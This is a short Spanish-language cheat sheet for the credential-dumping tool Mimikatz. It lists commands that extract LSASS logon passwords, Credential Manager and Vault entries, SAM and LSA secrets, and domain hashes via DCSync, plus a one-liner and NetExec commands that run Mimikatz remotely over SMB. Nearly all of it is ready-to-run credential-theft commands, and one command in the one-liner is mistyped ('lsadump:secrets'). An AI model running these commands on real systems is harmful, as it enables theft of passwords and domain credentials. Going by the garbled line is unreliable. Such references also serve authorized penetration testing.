Mimikatz

Mimikatz permite interactuar con credenciales en memoria, secretos LSA y material de autenticación de Windows. Sus resultados dependen de privilegios, protecciones activas y contexto de dominio.

Aviso: Requiere permisos elevados de Administrator para extraer Hashes

Mimikatz

.\mimikatz.exe # Ejecuta Mimikatz
privilege::debug # Habilita privilegio de depuración
token::elevate   # Habilita privilegios elevados

sekurlsa::logonpasswords # Extrae LSASS
sekurlsa::credman # Extrae credenciales de Credential Manager
vault::cred /patch # Extrae credenciales de Windows Vault  

lsadump::sam # Extrae SAM y SYSTEM
lsadump::secrets # Extrae SECURITY
lsadump::lsa # Extrae secretos LSA usando SECURITY + SYSTEM
lsadump::lsa /patch # Extrae secretos LSA usando SECURITY + SYSTEM

lsadump::dcsync # Extrae NTDS

# LSASS: Proceso que ejecuta LSA y almacena en su memoria credenciales locales y dominio
# SAM: Base de datos de credenciales locales. Se descifra con SYSTEM
# SECURITY: Registro que almacena credenciales de LSA Secrets
# NTDS.dit: Base de datos de credenciales del dominio.

Mimikatz OneLiner

.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump:secrets" "exit"

Kali: Mimikatz

nxc smb <ip> -u <user_admin> -p <pass> -M mimikatz
nxc smb <ip> -u <user_admin> -p <pass> --local-auth -M mimikatz
nxc smb <ip> -u <user_admin> -p <pass> -M mimikatz -o COMMAND='privilege::debug'
